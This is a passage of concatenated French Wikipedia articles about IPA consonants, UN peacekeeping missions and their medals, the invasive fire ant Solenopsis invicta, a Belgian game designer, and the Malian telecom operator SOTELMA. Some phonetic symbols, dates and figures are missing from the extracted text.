Symboles de l'API.
Son symbole complet dans l'alphabet phonétique international est , représentant un K minuscule dans l'alphabet latin, suivi d'un X minuscule, reliés par un tirant. Le tirant est souvent omis quand cela ne crée pas d'ambiguïté. Une alternative est de mettre le X en exposant, pour indiquer le relâchement fricatif de l'affriquée.
En français.
Le français ne possède pas le .

</doc>
<doc id="568577" url="https://fr.wikipedia.org/wiki?curid=568577" title="Opération des Nations unies au Mozambique">
Opération des Nations unies au Mozambique

L’Opération des Nations unies au Mozambique fut mise en place le par la Résolution 782 du Conseil de sécurité pour assister la mise en œuvre des accords de paix signés entre le Président du Mozambique Joaquim Chissano et le président de la Résistance nationale du Mozambique (RENAMO), Afonso Dhlakama. Le mandat devait faciliter la mise en œuvre des accords, surveiller le respect du cessez-le-feu, superviser le retrait des forces armées étrangères, assurer la sécurité dans les corridors de transport, ainsi que superviser et fournir une assistance technique au processus électoral]. L'ONUMOZ opéra de jusqu'au 9 décembre 1994.
Décoration.
L'insigne de Médaille de l’Onumoz.
Cette médaille est décernée en reconnaissance de 90 jours de service à compter de 1992.
Le ruban.
Le ruban est composé de cinq bandes vert pâle (), blanc (), bleu ONU (), blanc () et vert pâle ().

</doc>
<doc id="568578" url="https://fr.wikipedia.org/wiki?curid=568578" title="Consonne affriquée uvulaire sourde">
Consonne affriquée uvulaire sourde

La consonne affriquée uvulaire sourde est un son consonantique peu fréquent dans les langues. Le symbole dans l'alphabet phonétique international est .
Selon les langues, il peut être simple , aspiré , éjectif , etc.
Caractéristiques.
Voici les caractéristiques de la consonne affriquée uvulaire sourde :
Symboles de l'API.
Son symbole complet dans l'alphabet phonétique international est , représentant un Q minuscule dans l'alphabet latin, suivi d'un chi minuscule, reliés par un tirant. Le tirant est souvent omis quand cela ne crée pas d'ambiguïté. Une alternative est de mettre le chi en exposant, pour indiquer le relâchement fricatif de l'affriquée.

</doc>
<doc id="568579" url="https://fr.wikipedia.org/wiki?curid=568579" title="Consonne affriquée bilabiale sourde">
Consonne affriquée bilabiale sourde



</doc>
<doc id="568580" url="https://fr.wikipedia.org/wiki?curid=568580" title="Groupe d'observateurs militaires de l'ONU pour l'Iran et l'Irak">
Groupe d'observateurs militaires de l'ONU pour l'Iran et l'Irak

Le Groupe d'observateurs militaires de l'ONU pour l'Iran et l'Irak (GOMNUII/UNIIMOG) a été décidé par le par la résolution 598 du Conseil de sécurité des Nations unies, puis mis en place par la résolution 618 du 9 août 1988. Son mandat est de superviser l'application de l'accord de cessez-le-feu conclu en 1988 entre l'Iran et l'Irak.
Pays participants.
Pays participants :
Médaille du GOMNUII.
Le ruban est composé de sept bandes : vert (), blanc (), rouge (), bleu ONU (), rouge (), blanc () et noir (). Cette médaille était décernée en reconnaissance de 90 jours de service entre le et le .

</doc>
<doc id="568581" url="https://fr.wikipedia.org/wiki?curid=568581" title="Consonne affriquée rétroflexe voisée">
Consonne affriquée rétroflexe voisée

La consonne affriquée rétroflexe voisée est un son consonantique assez peu fréquent dans les langues parlées. Son symbole dans l'alphabet phonétique international est .
Caractéristiques.
Voici les caractéristiques de la consonne affriquée rétroflexe voisée :
Symboles de l'API.
Son symbole complet dans l'alphabet phonétique international est , représentant un D minuscule dans l'alphabet latin, suivi d'un Z minuscule, tous deux diacrités d'un crochet rétroflexe (descendant vers la droite, accroché à l’extrémité inférieure) et reliés par un tirant. Une alternative simplifiée est de n'employer le crochet rétroflexe que pour le Z. Le tirant est souvent omis quand cela ne crée pas d'ambiguïté.
En français.
Le français ne possède pas le .

</doc>
<doc id="568583" url="https://fr.wikipedia.org/wiki?curid=568583" title="Opération des Nations unies en Somalie">
Opération des Nations unies en Somalie

Il a existé deux opérations des Nations unies en Somalie (ONUSOM) :

</doc>
<doc id="568584" url="https://fr.wikipedia.org/wiki?curid=568584" title="Consonne affriquée labio-dentale sourde">
Consonne affriquée labio-dentale sourde

La consonne affriquée labio-dentale sourde est un son consonantique rare, présent dans quelques langues. Son symbole dans l’alphabet phonétique international est .
Caractéristiques.
Voici les caractéristiques de la consonne fricative labio-dentale sourde :
Symboles de l'API.
Son symbole complet dans l'alphabet phonétique international est , représentant un P minuscule dans l'alphabet latin, suivi d'un F minuscule, reliés par un tirant. Le tirant est souvent omis quand cela ne crée pas d'ambiguïté. Une alternative est de mettre le F en exposant, pour indiquer le relâchement fricatif de l'affriquée. 
Par défaut, la phase occlusive indiquée par le P est supposée bilabiale ; il est possible de préciser qu'elle est labiodentale en le diacritant d'un pontet souscrit indiquant une consonne dentale. Une alternative non officielle est d'employer la lettre supplémentaire de l'alphabet latin ȹ, ligature d'un P et d'un Q minuscules. 
En français.
Le français ne possède pas le .

</doc>
<doc id="568585" url="https://fr.wikipedia.org/wiki?curid=568585" title="Misterio de Elche">
Misterio de Elche



</doc>
<doc id="568586" url="https://fr.wikipedia.org/wiki?curid=568586" title="Mission des Nations unies pour l'organisation d'un référendum au Sahara occidental">
Mission des Nations unies pour l'organisation d'un référendum au Sahara occidental

La mission des Nations unies pour l'organisation d'un référendum au Sahara occidental (MINURSO) est une opération de maintien de la paix des Nations unies au Sahara occidental. Son quartier général est établi à Laâyoune.
Histoire.
Créé le par la résolution 690 du Conseil de sécurité, ce détachement de 230 militaires surveille les activités des forces en présence ainsi que la préparation du référendum sur le statut final.
Son but est d'organiser un référendum devant déterminer l'avenir de la région et assurer la réduction des activités militaires sur le territoire. La question fondamentale consistait à décider si les habitants du Sahara occidental voulaient leur indépendance ou préféraient s'intégrer au Maroc. Après le référendum, la Mission avait pour mandat de surveiller le cessez-le-feu. Si le cessez-le-feu est globalement respecté, le référendum prévu en 1992 est constamment reporté du fait de l'absence de consensus entre les parties. En 2007, un projet d'autonomie présenté par le Maroc est repoussé par le Front Polisario qui continue de défendre l'idée d'un référendum. Ce projet prévoyait la création d'un gouvernement et d'un Parlement sahraoui tandis que le Maroc conserverait les compétences en matière d'affaires étrangères, de défense, de monnaie et de gendarmerie.
Du 5 au , le secrétaire général des Nations unies, Ban Ki-moon, s'est rendu dans les zones contestées du Sahara occidental et au camp de réfugiés sahraouis de Tindouf en Algérie. Lors de cette visite, le secrétaire général a utilisé le terme « d'occupation » et a à nouveau souligné que l'ONU était prête à encadrer la tenue d'un référendum si les parties trouvaient un accord. Ces propos ont provoqué la colère du gouvernement marocain qui a accusé le secrétaire général d'avoir manqué à son devoir de neutralité. Le , une manifestation organisée par l'État en faveur de l'unité marocaine et du Sahara marocain eut lieu à Rabat, regroupant près de 3 millions de personnes selon l'agence officielle MAP, utilisant des banderoles qualifiant de « lâche » le secrétaire général des Nations unies. Le , un communiqué officiel des Nations unies reproche un manque de respect envers le secrétaire général et les Nations unies Ban Ki Moon et demande que Salaheddine Mezouar, ministre des Affaires étrangères marocain assure le respect de l'institution et ses représentants au Maroc. Le communiqué souligne également qu'il s'agirait d'une interprétation erronée des propos du secrétaire général qui estime avoir agi dans les limites du mandat confié par le Conseil de sécurité et n'avoir employé ce terme que « pour décrire sa réaction personnelle au sort des réfugiés sahraouis ». Le lendemain, Vladimir Poutine apporte son soutien au Maroc, soulignant la nécessité de ne pas « précipiter [… le…] processus politique » et réaffirmant que les Nations unies devaient avoir un « rôle constructif ». Les 19 et , le Maroc décide d'expulser les 80 fonctionnaires civils de la MINURSO.
En dépit de cette expulsion, et à la suite de la présentation du rapport annuel, le Conseil de sécurité a adopté la résolution 2285, renouvelant le mandat de la MINURSO jusqu'en . Cette résolution demande au Maroc de permettre le retour de la MINURSO, de veiller à sa sécurité ainsi qu'à l'accès aux populations, et de reprendre les négociations. Le Conseil de sécurité a réitéré sa confiance envers le secrétaire général de l'ONU et a demandé que le processus d'autodétermination engagé puisse se poursuivre. La Chine, la Russie et la Nouvelle-Zélande se sont abstenues lors de ce vote. En , le Maroc aurait commencé à se conformer aux résolutions de l'ONU, sous couvert de conditions.
Par l'adoption, le , de la résolution 2548, par 13 voix pour et les abstentions de la fédération de Russie et de l’Afrique du Sud, le Conseil de sécurité a prorogé, le mandat de la Mission jusqu’au . Le Conseil dit « appuyer pleinement les efforts du secrétaire général pour maintenir le processus de négociation afin de parvenir à un règlement de la question du Sahara occidental. Il se félicite de la volonté du Maroc, du Front Polisario, de l’Algérie et de la Mauritanie de rester engagés dans ce processus, en faisant preuve « de réalisme et d’un esprit de compromis ».
Effectifs et budget.
En 2007, la mission comptait 477 personnes (dont 215 militaires et policiers) pour un budget d'environ 40 millions de dollars par an. Composition au : 27 militaires, 206 observateurs militaires, 4 policiers et à : 278 civils ; composition au : 27 militaires, 186 observateurs militaires, 6 policiers et à : 265 civils. Au : 46 militaires, 0 observateur militaire, 6 policiers, 198 autres et au : 260 civils.
Le , la MINURSO est composée de 195 personnes (sans compter les civils), dont 27 militaires et 168 observateurs militaires :
Décoration.
Le ruban de la MINURSO est de couleur sable (brun pâle) flanqué de deux bandes latérales bleu ONU de de largeur.
Cette décoration est décernée en reconnaissance de 90 jours de service à compter du .

</doc>
<doc id="568587" url="https://fr.wikipedia.org/wiki?curid=568587" title="Consonne affriquée latérale alvéolaire sourde">
Consonne affriquée latérale alvéolaire sourde

La consonne affriquée latérale alvéolaire sourde est un son consonantique en usage dans certaines langues parlées. Son symbole dans l'alphabet phonétique international est .
Selon les langues, il peut être simple , aspiré , éjectif , etc.
Caractéristiques.
Voici les caractéristiques de la consonne affriquée latérale alvéolaire sourde :
Symboles de l'API.
Son symbole complet dans l'alphabet phonétique international est , représentant un T minuscule dans l'alphabet latin, suivi d'un L minuscule ceinturé, reliés par un tirant. Le tirant est souvent omis quand cela ne crée pas d'ambiguïté. 
En français.
Le français ne possède pas le .
Autres langues.
Le son se rencontre dans de très nombreuses langues amérindiennes. Il est écrit ƛ (lambda barré) dans la transcription des américanistes. Les orthographes de ces langues en alphabet latin emploient plutôt des digraphes :
Exemples dans d'autres familles linguistiques :
Le klingon, une langue construite de la série télévisée , possède cette consonne et l'écrit .

</doc>
<doc id="568588" url="https://fr.wikipedia.org/wiki?curid=568588" title="Mission d'observation des Nations unies en Irak et au Koweït">
Mission d'observation des Nations unies en Irak et au Koweït

La mission d'observation des Nations unies en Irak et au Koweït (MONUIK/UNIKOM) est une force d'interposition mise en place en par la Résolution 687 du Conseil de sécurité des Nations unies pour établir une zone tampon entre l'Irak et le Koweït. Le mandat de MONUIK se termina le à la suite de la guerre d'Irak.
Histoire.
Le mandat de l'ONU prévoyait de surveiller la zone démilitarisée le long de la frontière entre l'Irak et le Koweït (d'une profondeur de en Irak et de au Koweït) à la suite de la guerre du Golfe, de retirer les munitions non explosées et de la déminer.
L'effectif maximal fut atteint le avec . Au moment de la retraite le il restait quatre observateurs militaires et 131 civils en place. Le Quartier Général se trouvait en Irak, à Umm Qasr et 18 membres de la mission périrent (dont un légionnaire français).
Les contributeurs furent l'Allemagne, l'Argentine, l'Autriche, le Bangladesh, la Chine, le Danemark, les États-Unis, les îles Fidji, la Finlande, la France, le Ghana, la Grèce, la Hongrie, l’Inde, l’Indonésie, l'Irlande, l'Italie, le Kenya, la Malaisie, le Nigeria, le Pakistan, la Pologne, la Roumanie, le Royaume-Uni, la Russie, le Sénégal, Singapour, la Suède, la Thaïlande, la Turquie, l'Uruguay et le Venezuela.
Médaille de la MONUIK.
Le ruban de couleur sable comporte une bande centrale bleu ONU (). Cette médaille est décernée en reconnaissance de 90 jours de service à compter du .

</doc>
<doc id="568589" url="https://fr.wikipedia.org/wiki?curid=568589" title="Consonne occlusive éjective dentale">
Consonne occlusive éjective dentale

La consonne occlusive éjective dentale est un son consonantique existant dans certaines langues. Le symbole dans l'alphabet phonétique international est .
Caractéristiques.
Voici les caractéristiques de la consonne occlusive éjective dentale :
Dans les autres langues.
Le géorgien possède le [t̪'] .

</doc>
<doc id="568590" url="https://fr.wikipedia.org/wiki?curid=568590" title="Consonne occlusive linguo-labiale sourde">
Consonne occlusive linguo-labiale sourde

La consonne occlusive linguo-labiale sourde est un son consonantique fréquent dans de plusieurs langues. Le symbole dans l'alphabet phonétique international est ou .
Caractéristiques.
Voici les caractéristiques de la consonne occlusive linguo-labiale sourde :

</doc>
<doc id="568591" url="https://fr.wikipedia.org/wiki?curid=568591" title="Consonne occlusive linguo-labiale voisée">
Consonne occlusive linguo-labiale voisée

La consonne occlusive linguo-labiale voisée est un son consonantique fréquent dans de plusieurs langues. Le symbole dans l'alphabet phonétique international est ou .
Caractéristiques.
Voici les caractéristiques de la consonne occlusive linguo-labiale voisée :

</doc>
<doc id="568592" url="https://fr.wikipedia.org/wiki?curid=568592" title="Solenopsis invicta">
Solenopsis invicta

Solenopsis invicta, parfois appelée fourmi de feu, est l'une des 215 espèces de fourmis du genre très commun "Solenopsis".
Bien qu'elle soit originaire d'Amérique du Sud, elle est maintenant plus connue aux États-Unis, en Australie, à Taïwan, aux Philippines et dans le sud de la Chine (province de Guangdong). En , plusieurs fourmilières de cette espèce ont été découvertes dans le nord de Hong Kong. Par la suite, après une inspection complète, on a trouvé plusieurs centaines de fourmilières dans différents quartiers de Hong Kong. On a également signalé des fourmilières à Macao, l'ancienne enclave portugaise qui jouxte la province de Guangdong. Elles ont été introduites aux Philippines par un avion cargo arrivé en à Manille en provenance du Texas via la Californie. Enfin, 88 nids sont repérés durant l’hiver 2022/2023 près de Syracuse, en Sicile.
Des colonies ont été introduites accidentellement aux États-Unis dans les années 1930 par le port de Mobile, dans l'Alabama. Des cargos en provenance de l'Amérique du Sud (plus probablement l'Argentine selon les dernières études d'entomologistes américains, mais peut-être le Brésil), à quai à Mobile, ont déchargé des marchandises infestées par ces fourmis. Depuis lors, elles se sont répandues de l'Alabama dans la plaine côtière et dans le piémont de la quasi-totalité des États du sud-est des États-Unis. Leur introduction accidentelle en Australie s'est produite de la même façon en 2001.
L'espèce est inscrite depuis 2022 sur liste des espèces exotiques envahissantes préoccupantes pour l'Union européenne. Cela signifie que cette espèce ne peut pas être importée, élevée, transportée, commercialisée, ou libérée intentionnellement dans la nature, et ce nulle part dans l’Union européenne.
Risques et dangers.
Bien que leurs piqûres soient rarement dangereuses pour les grands animaux, elles peuvent tuer des animaux plus petits, comme des oiseaux. Elles sont capables de tuer un veau nouveau-né si celui-ci ne se dresse pas sur ses pattes assez vite.
Les piqûres, bien que douloureuses, ne mettent pas en péril la vie de l'homme, mais quelques rapports médicaux ou d'entomologie médicale ont signalé une réponse anaphylactique chez un enfant piqué et de rares attaques de fourmis sur des résidents d'établissements de santé ou de maisons de retraite (patients immobiles et/ou déficients cognitifs) (6 cas connus entre 1994 et 2004). L'une des victimes a présenté une réaction anaphylactique et 4 sont décédées dans les 7 jours après l'attaque. Ces fourmis avaient été signalées quelques jours avant les attaques (qui peuvent créer une obstruction des voies respiratoires, une aggravation d'un mauvais état de santé préexistant ou une anaphylaxie).
Des recommandations ont été publiées pour limiter les risques de pénétration d'établissements de santé et mieux réagir en cas de piqûres.
Généralités.
Les fourmis de feu sont plus agressives que la plupart des espèces de fourmis autochtones et se distinguent par leur piqûre douloureuse (1,2 sur l'échelle de Schmidt). Lorsqu'un animal ou une personne marche par inadvertance sur un de leurs tumulus, elle provoque une effervescence des insectes qui essaiment rapidement et attaquent en masse. Les fourmis sont réceptives aux phéromones émises par la première fourmi attaquante. Les fourmis se forment alors en essaim et piquent immédiatement et indistinctement au moindre mouvement.
Elles concurrencent efficacement les autres espèces de fourmis et ont réussi à agrandir leur aire de répartition, notamment aux États-Unis, où elles se sont répandues progressivement vers le nord et l'ouest malgré tous les efforts faits pour les combattre. De nos jours, elles sont présentes dans la plupart des États du Sud, en particulier le Texas, l'Oklahoma, la Louisiane, l'Arkansas, le Mississippi, l'Alabama, le Tennessee, la Géorgie, la Floride, la Caroline du Nord, la Caroline du Sud, le Maryland et la Virginie. Il n'est pas rare de voir soudainement apparaître plusieurs fourmilières dans un jardin ou un champ agricole, apparemment du jour au lendemain.
Au moins une collectivité se sert de la présence des fourmis de feu comme d'un argument publicitaire : Marshall (Texas) héberge un festival annuel de la fourmi de feu.
Les fourmis de feu sont toujours en mouvement, voyageant d'une région à l'autre dans les mottes de gazon, les racines de plantes de pépinières ou d'autres produits agricoles. Elles sont nuisibles non seulement à cause de la douleur qu'elles peuvent infliger, mais aussi du fait des tumulus qu'elles édifient, endommageant les racines des plantes et provoquant des pertes de récoltes.
Les fourmis de feu sont très résistantes. Elles sont adaptées tant aux inondations qu'aux sécheresses. Quand elles sentent le niveau de l'eau monter dans leurs nids, elles se rassemblent pour former une grosse boule, sorte de radeau capable de flotter sur l'eau, les ouvrières à l'extérieur et la reine à l'intérieur. Lorsque la boule atteint un arbre ou quelque autre objet résistant et statique, les fourmis essaiment sur ce support et y attendent que le niveau de l'eau régresse. Pour résister à la sécheresse, la structure des nids comporte un réseau de galeries souterraines de ravitaillement qui s'étend vers le bas jusqu'à la nappe phréatique. En outre, elles n'hibernent pas et résistent au froid jusqu'à environ.
En 2008 aux États-Unis, les humains sont en mesure de contrôler les fourmis de feu, mais pas de les éradiquer.
De nombreux produits sont disponibles pour détruire les colonies de fourmis dès qu'elles apparaissent, fourmilière par fourmilière. Mais il est indispensable d'atteindre et de tuer la reine (ou les reines) 
 qui peut se trouver jusqu'à deux mètres en profondeur dans le sol.
Sinon, la reine peut simplement se déplacer non loin et reconstituer rapidement la colonie.
L'introduction des fourmis de feu pose au un problème agricole et urbain dans tout le sud-est des États-Unis. Elles provoquent de plus en plus de dommages économiques et environnementaux, voire sanitaires.
Le , on a découvert une irruption de fourmis de feu dans le Queensland. Certains scientifiques et de nombreux marins pensent que les fourmis se trouvaient dans des conteneurs arrivés dans le port de Brisbane en provenance des États-Unis. Certains témoignages laissent penser que ces fourmis étaient présentes en Australie six à huit ans avant leur identification officielle.
Alors que l'irruption constatée ne concerne qu'une région limitée du sud-est du Queensland près de Brisbane, les risques sur les plans social, économique et environnemental ont poussé le gouvernement australien à réagir très rapidement. La première réponse d'urgence fut suivie par la création du « Centre de contrôle des fourmis de feu » en . Un programme d'éradication étalé sur six ans, subventionné conjointement par l'État et les autorités fédérales à hauteur de 175 millions de dollars australiens, mobilise plus de 600 personnes et doit permettre une vaste campagne de traitements, renouvelés 8 à 12 fois, sur une surface d'environ , suivie d'une période de surveillance de deux ans. Après quatre années de cette campagne d'éradication, le Centre de contrôle des fourmis de feu évalue à plus de 99 % le taux d'éradication dans les zones précédemment infestées.
Structure anatomique.
Comme toutes les fourmis, les fourmis de feu ont un corps à symétrie bilatérale parfaite, organisé sur un exosquelette rigide : leur corps ne contient ni os ni tissus de soutien internes, mais seulement un tégument coriace pour assurer soutien et protection. Elles respirent par des trachées.
Le corps se compose de trois parties principales : la tête, le thorax et l'abdomen. Elles ont trois paires de pattes et une paire d'antennes attachée à la tête. Comme toutes les fourmis, les ouvrières et les soldats sont des femelles stériles. La reine assure la ponte de milliers d'œufs. Le nombre de mâles est très faible car un seul d'entre eux suffit à assurer l'ensemble du processus de reproduction.
Les fourmis de feu ne mordent pas. Elles se servent de leurs mandibules pour s'accrocher et, comme les abeilles, les guêpes et les bourdons, elles injectent leur venin à l'aide d'un dard situé à l'extrémité de l'abdomen. Bien accrochées à leur victime grâce à leurs fortes mandibules, elles peuvent piquer plusieurs fois de suite.
Cycle de vie.
Le cycle de vie démarre quand la reine s'accouple avec un mâle.
Les mâles et les reines vierges sont ailés, ce qui permet à la colonie de se disperser. Les insectes sexués (ou ailés) s'envolent, parfois jusqu'à 30 mètres de haut, formant un grand nuage, et s'accouplent en vol. Après avoir inséminé les femelles de leur sperme, les mâles meurent. Les femelles partent alors à la recherche d'un lieu propice pour créer le nid, perdent leurs ailes et commencent à pondre.
En attendant que la première génération d'ouvrières, appelées "minums", soit capable de subvenir à sa nourriture, la reine survit en puisant dans ses réserves internes de graisse et dans l'énergie venant de la destruction de ses muscles de vol désormais inutiles.
Le premier groupe d'environ une dizaine d'œufs met 11 jours approximativement pour éclore. Il faut environ 20 jours supplémentaires pour que les larves deviennent des ouvrières.
Les premières ouvrières sont très petites. Leur taille et leur nombre augmentent progressivement, au fur et à mesure que la reine est mieux nourrie.
Expansion.
Depuis leur introduction en Amérique du Nord dans les années 1930, les fourmis de feu se sont reproduites de manière exponentielle.
Elles édifient des tumulus, dont la taille n'excède guère 45 cm en diamètre et en hauteur, sur le sol, près des habitations et d'autres bâtiments, et parfois à l'intérieur à la recherche de nourriture et d'humidité.
Elles sont une nuisance et peuvent constituer une menace pour des personnes endormies ou alitées, ainsi que pour les petits animaux de compagnie. À l'occasion, elles se nourrissent aux dépens des plantes potagères dans les jardins familiaux.
Les plus graves dommages se produisent en général pendant les périodes de temps sec et chaud quand elles envahissent les plates-bandes de fleurs cherchant chaleur et humidité. Lorsqu'elles sont dérangées, les fourmis de feu mordent et piquent les intrus. Le dard de cette fourmi a un venin contenant un alcaloïde nécrosant qui provoque à la fois une douleur et la formation de pustules blanches qui apparaissent le lendemain de la piqûre.
Ces fourmis ont été très étudiées à cause des dommages qu'elles peuvent provoquer dans les fermes, les bâtiments, et des atteintes physiques qu'elles infligent aux animaux, voire aux personnes. Elles sont extrêmement agressives et sont capables d'injecter leur venin en grand nombre en même temps.
Elles sont attirées par les champs électriques et rampent dans les unités de climatisation et le câblage des feux de signalisation, les mettant en court-circuit. C'est la première cause de pannes de ces feux au Texas.
Les fourmis de feu sont d'excellents prédateurs naturels de nombreux ravageurs des cultures tels que la pyrale de la canne à sucre, la punaise puante du riz, le forficule du sable, les pucerons, le charançon du coton, l'arpenteuse du soja, le ver du cotonnier, la mouche des cornes et beaucoup d'autres ennemis des cultures et de l'élevage. Elles tuent aussi des espèces utiles, des pollinisateurs tels que les espèces d'abeilles nichant au sol. Leur régime alimentaire comprend aussi graines, fruits, feuilles, racines, écorces, nectar, sève, champignons et nécrophores. Elles sont suffisamment efficaces dans leur domination des intrus pour nettoyer toute une région de ses invertébrés, lézards et oiseaux nicheurs.
Depuis , Taïwan est fortement infestée par les fourmis de feu. Ces fourmis sont de couleur orange ou rouge, cependant il ne faut pas généraliser, une fourmi de couleur rouge ne pique pas forcément. Quelques personnes auraient succombé à leur venin. Une vaste campagne a été engagée pour les éliminer mais n'a pas réussi à les éradiquer.
Une polémique a éclaté en Chine en janvier 2005 lorsqu'il est apparu que le gouvernement provincial de Guangdong avait occulté toute information sur l'expansion des fourmis de feu dans la province depuis la mi-2004. Les journaux de Hong Kong, notamment "Appledaily", "Mingpao", le "Hong Kong Economic Times", "Singtao" et "Takungpao" (ce dernier étant financé par le gouvernement chinois), ont tous signalé que les fourmis avaient été découvertes à Shenzhen et à Wuchuan, deux localités de la province de Guangdong.
Selon les communiqués de presse du ministère de l'agriculture, de la pêche et de la conserverie de Hong Kong, les autorités municipales ont également repéré plusieurs fourmilières de "Solenopsis invicta" dans un marais artificiel du secteur Nord-Ouest de Hong Kong.
On a également signalé des fourmilières dans le métro de Manille et dans la province de Cavite aux Philippines depuis ,
Moyens de lutte.
Les fourmis de feu n'ont en pratique aucun ennemi naturel aux États-Unis, en Chine, aux Philippines ou en Australie. Beaucoup de scientifiques et d'institutions font des recherches pour mettre au point des méthodes pour enrayer leur expansion.
La lutte contre ces fourmis envahissantes s'est faite jusqu'ici à l'aide de produits insecticides, mais les recherches en cours visent à introduire des ennemis naturels de ces insectes.
Le protozoaire à microspores "Thelohania solenopsae" et le champignon "Beauveria bassiana" sont des agents pathogènes prometteurs. "Pseudacteon tricuspis" et "Pseudacteon curvatus" sont des mouches phorides parasitoides d'Amérique du Sud. Les phorides, originaires de l'aire d'habitat naturel des fourmis de feu en Amérique du Sud, sont des parasites naturels de ces fourmis. Les mouches femelles pondent chacune un œuf à la jointure de la tête et du thorax de leurs victimes, déclenchant chez les fourmis une réaction en forme de danse évoquant le jerk. La larve consomme par la suite l'intérieur de la tête, décapitant la fourmi, et utilise dans la suite du processus l'exosquelette comme loge pour la pupe.
L'importance des dégâts causés par les phorides est minime, mais les fourmis paraissent perturbées par la présence des mouches tourbillonnantes, perdant leur organisation sociale et cessant de ravitailler la colonie, et subissent ainsi des dommages plus importants à terme. En outre, les phorides sont des parasites très spécifiques et devraient, en théorie, épargner les espèces de fourmis indigènes. Les phorides ont été introduites en plusieurs points du sud-est des États-Unis, elles se reproduisent et se diffusent lentement dans toute la zone infestée par les fourmis de feu.
Dans certains cas, les méthodes de lutte biologique adoptées à la hâte se sont révélées plus néfastes qu'utiles (la gambusie en Australie en est un exemple), et l'efficacité de la lutte biologique dans le cas de ces fourmis reste à vérifier. Une fourmi parasite, "Solenopsis daguerri" (Santschi), peut également envahir les colonies pour remplacer la reine dans l'espoir de prendre le contrôle de la colonie. Son utilisation comme moyen de lutte biologique est également en cours d'examen. Il y a aussi la simple introduction de tamanoirs.
Les chercheurs sont également en train d'évaluer l'effet de chocs thermiques, par exemple par injection d'azote liquide ou de vapeur sous pression dans les nids, pour exterminer ces fourmis.
Taxonomie.
Le nom valide complet (avec auteur) de ce taxon est "Solenopsis invicta" Buren, 1972.
Ce taxon porte en français le nom vernaculaire ou normalisé suivant : Fourmi de feu.
"Solenopsis invicta" a pour synonyme :

</doc>
<doc id="568593" url="https://fr.wikipedia.org/wiki?curid=568593" title="Consonne occlusive éjective bilabiale sourde">
Consonne occlusive éjective bilabiale sourde



</doc>
<doc id="568594" url="https://fr.wikipedia.org/wiki?curid=568594" title="Consonne occlusive injective uvulaire voisée">
Consonne occlusive injective uvulaire voisée



</doc>
<doc id="568595" url="https://fr.wikipedia.org/wiki?curid=568595" title="Consonne occlusive injective bilabiale voisée">
Consonne occlusive injective bilabiale voisée

La consonne occlusive injective bilabiale voisée est un son consonantique existant dans certaines langues. Le symbole dans l'alphabet phonétique international est .
Caractéristiques.
Voici les caractéristiques de la consonne occlusive injective bilabiale :

</doc>
<doc id="568596" url="https://fr.wikipedia.org/wiki?curid=568596" title="Consonne occlusive éjective rétroflexe sourde">
Consonne occlusive éjective rétroflexe sourde



</doc>
<doc id="568597" url="https://fr.wikipedia.org/wiki?curid=568597" title="Kris Burm">
Kris Burm

Kris Burm (1957, Anvers, Belgique) est un auteur de jeux de société belge. Il est spécialisé dans les jeux abstraits laissant peu ou pas du tout de place au hasard.
Le Projet GIPF a pour ambition de créer 6 jeux complémentaires. Kris Burm, peut-être par coquetterie, a publié le sixième jeu avant le cinquième.

</doc>
<doc id="568598" url="https://fr.wikipedia.org/wiki?curid=568598" title="Consonne occlusive nasale linguo-labiale voisée">
Consonne occlusive nasale linguo-labiale voisée



</doc>
<doc id="568599" url="https://fr.wikipedia.org/wiki?curid=568599" title="Consonne spirante pharyngale voisée">
Consonne spirante pharyngale voisée



</doc>
<doc id="568600" url="https://fr.wikipedia.org/wiki?curid=568600" title="Consonne spirante épiglottale sourde">
Consonne spirante épiglottale sourde



</doc>
<doc id="568601" url="https://fr.wikipedia.org/wiki?curid=568601" title="Consonne affriquée rétroflexe sourde">
Consonne affriquée rétroflexe sourde

La consonne affriquée rétroflexe sourde est un son consonantique assez peu fréquent dans les langues parlées. Son symbole dans l'alphabet phonétique international est .
Caractéristiques.
Voici les caractéristiques de la consonne affriquée rétroflexe sourde :
Symboles de l'API.
Son symbole complet dans l'alphabet phonétique international est , représentant un T minuscule dans l'alphabet latin, suivi d'un S minuscule, tous deux diacrités d'un crochet rétroflexe (descendant vers la droite, accroché à l’extrémité inférieure) et reliés par un tirant. Une alternative simplifiée est de n'employer le crochet rétroflexe que pour le S. Le tirant est souvent omis quand cela ne crée pas d'ambiguïté.
En français.
Le français ne possède pas le .

</doc>
<doc id="568602" url="https://fr.wikipedia.org/wiki?curid=568602" title="Consonne roulée labio-dentale voisée">
Consonne roulée labio-dentale voisée



</doc>
<doc id="568603" url="https://fr.wikipedia.org/wiki?curid=568603" title="Consonne fricative linguo-labiale sourde">
Consonne fricative linguo-labiale sourde

La consonne fricative linguo-labiale sourde est un son consonantique fréquent dans de plusieurs langues. Le symbole dans l'alphabet phonétique international est , ou .
Caractéristiques.
Voici les caractéristiques de la consonne fricative linguo-labiale sourde :

</doc>
<doc id="568604" url="https://fr.wikipedia.org/wiki?curid=568604" title="Société des télécommunications du Mali">
Société des télécommunications du Mali

La Société des télécommunications du Mali (SOTELMA) ou Sotelma-Malitel, opérant sous la marque Moov Africa Malitel, est une entreprise malienne, filiale du groupe marocain IAM (Groupe Maroc Télécom).
Historique.
Créée en 1989, à la suite du démantèlement de l’Office des postes et des télécommunications entre d’un côté la SOTELMA et de l’autre de l’Office national des postes. Initialement entreprise publique, la SOTELMA est en cours de privatisation. Depuis le , Maroc Telecom détient 51 % du capital, l'État malien garde les 49 % restant. En 2024, l'Etat malien a acté le renouvellement de la licence de SOTELMA pour un montant de 160 milliards de FCFA. Le gouvernement malien annoncé également la reprise du control de la société avec l'augmentation de ses parts à 56%. Dans un soucis d'équité et de libre concurrence, le gouvernement malien décide d'octroyer en 2018, la licence 4G à SOTELMA.
Malitel, filiale de la Sotelma est depuis 2000 le premier réseau de téléphonie mobile au Mali.
En 2021, à l'instar des autres filiales du groupe Maroc Telecom, Malitel prend l'identité de Moov Africa Malitel. La SOTELMA siège actuellement à Bamako. 
Activités.
Son réseau couvre une dizaine de villes (Bamako, Ségou, Koulikoro, Bla, San, Mopti, Djenné, Kayes, Sadiola, Yatéla, Koutiala, Sikasso) et les axes routiers Bamako – Ségou, Koulikoro – Mafé – Sirakoroba – Banamba, Mafé – Tioribougou – Koulikoro, Ségou – Bla – San – Mopti – Djenné – Kanbaba, Bla – Koutiala – Sikasso, Bamako – Koulikoro. 
Elle propose une connexion haut débit par liaison spécialisée filaire, fibre optique ou par boucle locale radio et de l'ADSL qui couvre Bamako, Kayes, Sikasso, et Ségou.
Malitel est en concurrence avec Orange Mali et Telecel Mali.

</doc>
<doc id="568605" url="https://fr.wikipedia.org/wiki?curid=568605" title="Consonne fricative linguo-labiale voisée">
